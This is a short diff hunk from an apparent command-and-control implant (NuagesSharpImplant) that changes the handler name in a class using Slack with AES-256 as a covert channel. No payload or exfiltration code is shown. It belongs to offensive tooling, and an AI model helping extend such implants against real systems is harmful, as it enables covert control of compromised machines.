@@ -13,7 +13,7 @@ namespace NuagesSharpImplant
     public class SLACKAES256Connection : NuagesC2Connection
     {
 
-        private string handler = "PyAES256";
+        private string handler = "SLACKAES256Connection";
 
         private string slackAppToken;
 
